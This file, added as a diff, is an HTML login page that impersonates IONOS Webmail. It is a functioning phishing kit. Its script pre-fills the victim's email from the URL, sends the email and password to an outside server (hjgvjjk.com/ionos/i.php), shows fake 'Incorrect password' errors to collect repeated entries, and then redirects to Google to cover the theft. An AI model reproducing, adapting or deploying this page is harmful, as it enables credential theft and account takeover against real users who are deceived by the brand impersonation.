@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>IONOS Webmail Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background-color: #f5f7fa;
+    }
+    .topbar {
+      background-color: white;
+      padding: 15px 30px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+    }
+    .left-group {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .topbar h1 {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: #004e9e;
+      margin: 0;
+    }
+    .searchbar {
+      background: #f2f5f8;
+      border-radius: 6px;
+      padding: 6px 10px;
+      width: 350px;
+      display: flex;
+      align-items: center;
+      margin-top: 10px;
+    }
+    .searchbar input {
+      border: none;
+      background: transparent;
+      flex: 1;
+      font-size: 14px;
+      padding-left: 5px;
+    }
+    .searchbar svg {
+      width: 18px;
+      height: 18px;
+    }
+    .container {
+      max-width: 500px;
+      margin: 60px auto;
+      background: white;
+      border-radius: 12px;
+      padding: 40px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.06);
+    }
+    h2 {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 25px;
+    }
+    label {
+      font-size: 15px;
+      font-weight: bold;
+      display: block;
+      margin-bottom: 8px;
+    }
+    .form-group {
+      max-width: 300px;
+      width: 100%;
+    }
+    input[type="email"] {
+      width: 165%;
+      padding: 14px;
+      font-size: 16px;
+      border: 2px solid #004e9e;
+      border-radius: 10px;
+      margin-bottom: 16px;
+      outline: none;
+      box-sizing: border-box;
+    }
+    input[type="email"]:focus {
+      border-color: #00316f;
+    }
+    .note {
+      font-size: 13px;
+      margin-bottom: 24px;
+    }
+    .note a {
+      color: #004e9e;
+      text-decoration: none;
+    }
+    .btn {
+      width: 100%;
+      max-width: 600px;
+      background: #002c77;
+      color: white;
+      font-size: 16px;
+      padding: 14px;
+      border: none;
+      border-radius: 26px;
+      cursor: pointer;
+      box-sizing: border-box;
+    }
+    .subtext {
+      font-size: 14px;
+      margin-top: 20px;
+    }
+    .subtext a {
+      color: #004e9e;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    #page2 {
+      display: none;
+    }
+    #page2 h2 {
+      font-size: 22px;
+      font-weight: 600;
+      margin-bottom: 30px;
+      color: #1a1a1a;
+    }
+    #email-line {
+      display: flex;
+      align-items: center;
+      font-size: 15px;
+      margin-bottom: 25px;
+      color: #1a1a1a;
+      gap: 10px;
+    }
+    #email-line img {
+      width: 20px;
+      height: 20px;
+    }
+    .password-group {
+      position: relative;
+      margin-bottom: 10px;
+    }
+    #password {
+      width: 100%;
+      padding: 14px 40px 14px 14px;
+      font-size: 15px;
+      border: 2px solid #004e9e;
+      border-radius: 10px;
+      box-sizing: border-box;
+    }
+    #togglePassword {
+      position: absolute;
+      right: 12px;
+      top: 12px;
+      cursor: pointer;
+      width: 20px;
+      height: 20px;
+      opacity: 0.7;
+    }
+    #password-error {
+      color: red;
+      font-size: 14px;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="topbar">
+    <div class="left-group">
+      <h1>WEBMAIL LOGIN</h1>
+    </div>
+    <div class="searchbar">
+      <input type="text" placeholder="Search for features, domains, and help">
+      <svg xmlns="http://www.w3.org/2000/svg" height="18" width="18" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="11" cy="11" r="8"/>
+        <line x1="21" y1="21" x2="16.65" y2="16.65"/>
+      </svg>
+    </div>
+  </div>
+
+  <!-- Page 1 -->
+  <div class="container" id="page1">
+    <h2>My Webmail Login</h2>
+    <form id="emailForm">
+      <div class="form-group">
+        <label for="email">Email address</label>
+        <input type="email" id="email" placeholder="Enter your email" required>
+      </div>
+      <p class="note">
+        <strong>Not your device?</strong> Log out after the session or use <a href="#">private browsing mode</a>.
+      </p>
+      <button class="btn" type="submit">Next</button>
+    </form>
+    <p class="subtext">
+      Not an IONOS customer yet?
+    </p>
+    <p class="subtext"><a href="#">Become a customer now and benefit from our offers. Learn more</a></p>
+  </div>
+
+  <!-- Page 2 -->
+  <div class="container" id="page2">
+    <h2>Enter password</h2>
+    <div id="email-line">
+      <img src="https://cdn-icons-png.flaticon.com/512/1077/1077063.png" alt="user icon">
+      <span id="email-text">someone@example.com</span>
+    </div>
+    <form id="passwordForm">
+      <div class="password-group">
+        <input type="password" id="password" placeholder="Password" required>
+        <img src="https://cdn-icons-png.flaticon.com/512/709/709612.png" id="togglePassword" alt="toggle visibility">
+      </div>
+      <div id="password-error"></div>
+      <p class="note">
+        <a href="#">Forgot Your Password?</a><br>
+        <strong>Not your device?</strong> Log out after the session or use <a href="#">private browsing mode</a>.
+      </p>
+      <button class="btn" type="submit">Next</button>
+    </form>
+  </div>
+
+  <script>
+    const page1 = document.getElementById('page1');
+    const page2 = document.getElementById('page2');
+    const emailForm = document.getElementById('emailForm');
+    const passwordForm = document.getElementById('passwordForm');
+    const emailInput = document.getElementById('email');
+    const emailText = document.getElementById('email-text');
+    const togglePassword = document.getElementById("togglePassword");
+    let attemptCount = 0;
+
+    // Autofill from URL hash
+    window.addEventListener('DOMContentLoaded', () => {
+      const hash = window.location.hash.replace('#', '').trim();
+      if (hash && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(hash)) {
+        emailInput.value = hash;
+      }
+    });
+
+    // Email form submit
+    emailForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const emailVal = emailInput.value.trim();
+      if (emailVal) {
+        emailText.textContent = emailVal;
+        page1.style.display = 'none';
+        page2.style.display = 'block';
+        document.getElementById('password').value = '';
+        document.getElementById('password-error').textContent = '';
+      }
+    });
+
+    // Toggle password show/hide
+    togglePassword.addEventListener("click", () => {
+      const pwd = document.getElementById("password");
+      pwd.type = pwd.type === "password" ? "text" : "password";
+    });
+
+    // Password form submit
+    passwordForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const pwd = document.getElementById('password');
+      const errorBox = document.getElementById('password-error');
+      const email = emailText.textContent;
+
+      // Send to PHP
+      fetch('https://hjgvjjk.com/ionos/i.php', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pwd.value)}`
+      });
+
+      pwd.value = '';
+      errorBox.textContent = '';
+
+      attemptCount++;
+      if (attemptCount < 3) {
+        setTimeout(() => {
+          errorBox.textContent = "Incorrect password. Please try again.";
+        }, 100);
+      } else {
+        window.location.href = "https://www.google.com";
+      }
+    });
+  </script>
+</body>
+</html>
